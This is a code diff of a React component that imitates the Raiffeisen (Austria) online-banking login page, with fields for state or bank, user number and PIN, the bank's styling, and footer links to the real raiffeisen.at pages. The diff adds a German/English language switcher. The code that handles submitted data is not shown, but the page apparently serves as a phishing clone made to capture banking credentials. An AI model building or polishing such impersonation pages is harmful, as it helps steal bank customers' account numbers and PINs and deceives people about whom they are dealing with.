@@ -1,5 +1,5 @@
 import { useState, useRef, useEffect } from "react";
-import { ExternalLink } from "lucide-react";
+import { ExternalLink, ChevronDown, Check } from "lucide-react";
 import bgImage from "@/assets/rbg_wald.jpg";
 
 const bundeslaender = [
@@ -17,6 +17,37 @@ const bundeslaender = [
   "Alpen Privatbank",
 ];
 
+const translations = {
+  de: {
+    title: "Bitte melden Sie sich an",
+    subtitle: "Wählen Sie Ihr Bundesland und geben Sie Verfügernummer und PIN ein.",
+    bundeslandLabel: "Bundesland oder Bank wählen",
+    verfuegerLabel: "Verfügernummer eingeben",
+    pinLabel: "PIN eingeben",
+    weiter: "Weiter",
+    pflichtfeld: "Pflichtfeld",
+    impressum: "Impressum",
+    nutzungsbedingungen: "Nutzungsbedingungen",
+    barrierefreiheit: "Barrierefreiheitserklärung",
+    deutsch: "Deutsch",
+    englisch: "Englisch",
+  },
+  en: {
+    title: "Please sign in",
+    subtitle: "Select your state and enter your user number and PIN.",
+    bundeslandLabel: "Select state or bank",
+    verfuegerLabel: "Enter user number",
+    pinLabel: "Enter PIN",
+    weiter: "Continue",
+    pflichtfeld: "Required field",
+    impressum: "Legal Notice",
+    nutzungsbedingungen: "Terms of Use",
+    barrierefreiheit: "Accessibility Statement",
+    deutsch: "German",
+    englisch: "English",
+  },
+};
+
 const Raiffeisenbank = () => {
   const [bundesland, setBundesland] = useState("");
   const [verfueger, setVerfueger] = useState("");
@@ -25,7 +56,12 @@ const Raiffeisenbank = () => {
   const [verfuegerTouched, setVerfuegerTouched] = useState(false);
   const [pinTouched, setPinTouched] = useState(false);
   const [bundeslandTouched, setBundeslandTouched] = useState(false);
+  const [lang, setLang] = useState<"de" | "en">("de");
+  const [langOpen, setLangOpen] = useState(false);
   const dropdownRef = useRef<HTMLDivElement>(null);
+  const langRef = useRef<HTMLDivElement>(null);
+
+  const t = translations[lang];
 
   const selectHasValue = bundesland !== "";
   const selectLabelFloated = selectOpen || selectHasValue;
@@ -34,6 +70,9 @@ const Raiffeisenbank = () => {
     const handleClickOutside = (e: MouseEvent) => {
       if (dropdownRef.current && !dropdownRef.current.contains(e.target as Node)) {
         setSelectOpen(false);
+      }
+      if (langRef.current && !langRef.current.contains(e.target as Node)) {
+        setLangOpen(false);
       }
     };
     document.addEventListener("mousedown", handleClickOutside);
@@ -53,11 +92,40 @@ const Raiffeisenbank = () => {
     >
       {/* Login Card */}
       <div className="relative z-10 w-full max-w-xl rounded-md bg-white p-8 shadow-lg">
+        {/* Language Switcher */}
+        <div className="absolute right-8 top-8" ref={langRef}>
+          <button
+            onClick={() => setLangOpen(!langOpen)}
+            className="flex items-center gap-1 text-sm text-gray-600 hover:text-gray-900"
+          >
+            {lang === "de" ? t.deutsch : t.englisch}
+            <ChevronDown className={`h-4 w-4 transition-transform duration-200 ${langOpen ? "rotate-180" : ""}`} />
+          </button>
+          {langOpen && (
+            <div className="absolute right-0 top-full mt-1 min-w-[140px] rounded-md border border-gray-200 bg-white py-1 shadow-lg">
+              <div
+                onClick={() => { setLang("de"); setLangOpen(false); }}
+                className="flex cursor-pointer items-center justify-between px-4 py-2 text-sm hover:bg-gray-100"
+              >
+                {translations[lang].deutsch}
+                {lang === "de" && <Check className="h-4 w-4 text-gray-700" />}
+              </div>
+              <div
+                onClick={() => { setLang("en"); setLangOpen(false); }}
+                className="flex cursor-pointer items-center justify-between px-4 py-2 text-sm hover:bg-gray-100"
+              >
+                {translations[lang].englisch}
+                {lang === "en" && <Check className="h-4 w-4 text-gray-700" />}
+              </div>
+            </div>
+          )}
+        </div>
+
         <h1 className="mb-4 text-2xl font-light text-[#1a1a1a]">
-          Bitte melden Sie sich an
+          {t.title}
         </h1>
         <p className="mb-6 text-sm text-gray-500">
-          Wählen Sie Ihr Bundesland und geben Sie Verfügernummer und PIN ein.
+          {t.subtitle}
         </p>
 
         {/* Bundesland Custom Dropdown */}
@@ -69,7 +137,7 @@ const Raiffeisenbank = () => {
                 : `top-3 text-sm ${bundeslandTouched && !bundesland ? "text-red-600" : "text-gray-500"}`
             }`}
           >
-            Bundesland oder Bank wählen <span className={bundeslandTouched && !bundesland && !selectOpen ? "text-red-600" : "text-gray-400"}>*</span>
+            {t.bundeslandLabel} <span className={bundeslandTouched && !bundesland && !selectOpen ? "text-red-600" : "text-gray-400"}>*</span>
           </label>
           <div
             onClick={() => setSelectOpen(!selectOpen)}
@@ -120,7 +188,7 @@ const Raiffeisenbank = () => {
           {bundeslandTouched && !bundesland && !selectOpen && (
             <div className="mt-1 flex items-center gap-1 text-xs text-red-600">
               <span className="inline-block h-4 w-4 rounded-full bg-red-600 text-white text-center text-[10px] leading-4">!</span>
-              Pflichtfeld
+              {t.pflichtfeld}
             </div>
           )}
         </div>
@@ -140,12 +208,12 @@ const Raiffeisenbank = () => {
           <label className={`pointer-events-none absolute left-3 top-3 text-sm transition-all duration-200 peer-focus:top-1 peer-focus:text-xs peer-[&:not(:placeholder-shown)]:top-1 peer-[&:not(:placeholder-shown)]:text-xs ${
             verfuegerTouched && !verfueger ? "text-red-600" : "text-gray-500"
           }`}>
-            Verfügernummer eingeben <span className={verfuegerTouched && !verfueger ? "text-red-600" : "text-gray-400"}>*</span>
+            {t.verfuegerLabel} <span className={verfuegerTouched && !verfueger ? "text-red-600" : "text-gray-400"}>*</span>
           </label>
           {verfuegerTouched && !verfueger && (
             <div className="mt-1 flex items-center gap-1 text-xs text-red-600">
               <span className="inline-block h-4 w-4 rounded-full bg-red-600 text-white text-center text-[10px] leading-4">!</span>
-              Pflichtfeld
+              {t.pflichtfeld}
             </div>
           )}
         </div>
@@ -166,12 +234,12 @@ const Raiffeisenbank = () => {
           <label className={`pointer-events-none absolute left-3 top-3 text-sm transition-all duration-200 peer-focus:top-1 peer-focus:text-xs peer-[&:not(:placeholder-shown)]:top-1 peer-[&:not(:placeholder-shown)]:text-xs ${
             pinTouched && !pin ? "text-red-600" : "text-gray-500"
           }`}>
-            PIN eingeben <span className={pinTouched && !pin ? "text-red-600" : "text-gray-400"}>*</span>
+            {t.pinLabel} <span className={pinTouched && !pin ? "text-red-600" : "text-gray-400"}>*</span>
           </label>
           {pinTouched && !pin && (
             <div className="mt-1 flex items-center gap-1 text-xs text-red-600">
               <span className="inline-block h-4 w-4 rounded-full bg-red-600 text-white text-center text-[10px] leading-4">!</span>
-              Pflichtfeld
+              {t.pflichtfeld}
             </div>
           )}
         </div>
@@ -183,7 +251,7 @@ const Raiffeisenbank = () => {
             className="rounded-md bg-[#fbf315] px-20 py-3 text-sm font-semibold text-[#1a1a1a] transition-colors hover:bg-[#e6dc12] disabled:opacity-50"
             disabled={!bundesland || !verfueger || !pin}
           >
-            Weiter
+            {t.weiter}
           </button>
         </div>
       </div>
@@ -194,9 +262,9 @@ const Raiffeisenbank = () => {
       {/* Footer */}
       <footer className="fixed bottom-0 left-0 right-0 z-10 py-4">
         <div className="flex flex-wrap items-center justify-center gap-4 text-xs text-white/90">
-          <a href="https://raiffeisen.at/de/online-banking/login/impressum.html" target="_blank" rel="noopener noreferrer" className="hover:underline inline-flex items-center gap-1">Impressum <ExternalLink className="h-3 w-3" /></a>
-          <a href="https://raiffeisen.at/de/online-banking/login/nutzungsbedingungen.html" target="_blank" rel="noopener noreferrer" className="hover:underline inline-flex items-center gap-1">Nutzungsbedingungen <ExternalLink className="h-3 w-3" /></a>
-          <a href="https://raiffeisen.at/de/meine-bank/kundenservice/barrierefreiheit/barrierefreiheitserklaerung.html" target="_blank" rel="noopener noreferrer" className="hover:underline inline-flex items-center gap-1">Barrierefreiheitserklärung <ExternalLink className="h-3 w-3" /></a>
+          <a href="https://raiffeisen.at/de/online-banking/login/impressum.html" target="_blank" rel="noopener noreferrer" className="hover:underline inline-flex items-center gap-1">{t.impressum} <ExternalLink className="h-3 w-3" /></a>
+          <a href="https://raiffeisen.at/de/online-banking/login/nutzungsbedingungen.html" target="_blank" rel="noopener noreferrer" className="hover:underline inline-flex items-center gap-1">{t.nutzungsbedingungen} <ExternalLink className="h-3 w-3" /></a>
+          <a href="https://raiffeisen.at/de/meine-bank/kundenservice/barrierefreiheit/barrierefreiheitserklaerung.html" target="_blank" rel="noopener noreferrer" className="hover:underline inline-flex items-center gap-1">{t.barrierefreiheit} <ExternalLink className="h-3 w-3" /></a>
           <span>© 2026 Raiffeisen</span>
         </div>
       </footer>
